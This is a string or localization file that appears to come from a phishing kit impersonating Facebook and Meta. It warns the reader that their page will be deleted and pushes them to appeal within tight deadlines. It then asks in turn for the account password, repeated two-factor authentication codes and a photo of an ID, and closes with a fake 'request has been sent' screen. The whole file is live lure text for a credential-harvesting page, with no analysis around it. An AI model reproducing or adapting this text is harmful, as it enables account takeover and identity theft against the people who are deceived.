top_content.title: We have scheduled your page to be deleted

sub.sub_1: We have received several reports that your account violates our terms of service and community guidelines. As a result, your account will be sent for verification.
sub.sub_2: If you believe restrictions have been placed on your account in error, you can request a review.

sub.sub_1: Fact checkers may not respond to requests that contain intimidation, hate speech, or other verbal threats.
sub.sub_2: In your appeal, please include all necessary information to allow the fact checker to process your request in a timely manner. If you provide an invalid email address or do not respond to a request for additional information within 2 days, the fact checker may close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.
sub.sub_3: When everything is ready, we will review your account and determine whether restrictions apply to it. The verification procedure usually lasts 24 hours, but in some cases it may take longer. Depending on our decision, the restrictions imposed will remain in effect or will be lifted and your account will be reinstated.

sub.sub_2: Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.

Depending on our decision, the restrictions imposed will remain in effect or will be lifted and your account will be reinstated.

issue.note: Our response will be sent to you within 14 - 48 hours.

facebook_notification.title: on Facebook
facebook_notification.description: We will send you a notification on Facebook.

password.title: Password
password.description: For your security, you must enter your password to continue.

password.warning: The password you've entered is incorrect.

2fa.title: Two-factor authentication required (1/3)
2fa.description: The verification code has been sent to your phone number or E-mail, please check your inbox and enter the code below to complete. In case you do not receive the code, please check the Facebook notification on your device and confirm it is you to complete the verification process.

form.warning: The two-factor authentication you entered is incorrect. Please, try again after
form.required: You haven't entered your two-factor authentication!

sub_title.sub_1: Before we can get you back on Facebook safely, we need to make sure this your account. You can prove this account is yours by sending us a photo of your ID.
sub_title.sub_2: We don't accept photos of a computer screen, a phone screen or a photocopy. If there are any issues, we'll send you an email.
sub_title.sub_3: We'll store an encrypted copy of your selfie for up to one year to improve our ability to detect fake photos, keeping Facebook safe from impersonation.
sub_title.sub_4: Change how long we store your selfie for

final_step.title: Request has been sent
final_step.description: Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.

authen_modal.title: Choose a way to confirm that it's you
